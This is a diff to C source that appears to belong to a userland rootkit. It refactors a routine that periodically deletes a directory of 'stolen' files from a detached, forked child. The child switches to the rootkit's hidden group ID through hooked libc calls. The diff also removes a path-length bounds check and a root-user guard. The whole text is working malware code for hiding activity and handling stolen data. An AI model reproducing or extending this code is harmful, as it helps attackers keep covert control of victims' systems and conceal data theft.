@@ -13,8 +13,6 @@ void rmstolens(void){
             continue;
 
         pathlen = strlen(INTEREST_DIR) + strlen(dir->d_name) + 2;
-        if(pathlen>PATH_MAX) continue;
-
         char path[pathlen];
         snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
         call(CUNLINK, path);
@@ -22,55 +20,18 @@ void rmstolens(void){
     closedir(dp);
 }
 
-FILE *opencleanedtimepath(const char *mode){
-    hook(CFOPEN);
-    return call(CFOPEN, CLEANEDTIME_PATH, mode);
-}
-
-int getlastclean(void){
-    int currentlast;
-    FILE *fp;
-    char timbuf[64];
-
-    fp = opencleanedtimepath("r");
-    if(fp == NULL){
-        writelastclean(time(NULL));
-        return getlastclean();
-    }
-    fgets(timbuf, sizeof(timbuf), fp);
-    fclose(fp);
-
-    currentlast = atoi(timbuf);
-    return currentlast;
-}
-
-void writelastclean(int curtime){
-    FILE *fp;
-    char timbuf[64];
-
-    fp = opencleanedtimepath("w");
-    if(fp == NULL) return;
-
-    snprintf(timbuf, sizeof(timbuf), "%d", curtime);
-    hook(CFWRITE);
-    call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
-    fclose(fp);
-}
-
-int getlastcleandiff(int curtime){
-    int lastclean = getlastclean();
-    int diff = curtime - lastclean;
-    return diff;
-}
-
 void cleanstolen(void){
-    if(not_user(0) || rknomore())
-        return;
-
     int curtime = time(NULL);
-    if(getlastcleandiff(curtime) <= FILE_CLEANSE_TIMER)
-        return;
-
-    rmstolens();
-    writelastclean(curtime);
+    if(itistime(CLEANEDTIME_PATH, curtime, FILE_CLEANSE_TIMER)){
+        pid_t pid = fork();
+        if(pid == 0){
+            setsid();
+            hook(CSETGID);
+            call(CSETGID, readgid());
+            rmstolens();
+            exit(0);
+        }else if(pid < 0) return;
+        signal(SIGCHLD, SIG_IGN);
+        writenewtime(CLEANEDTIME_PATH, curtime);
+    }
 }
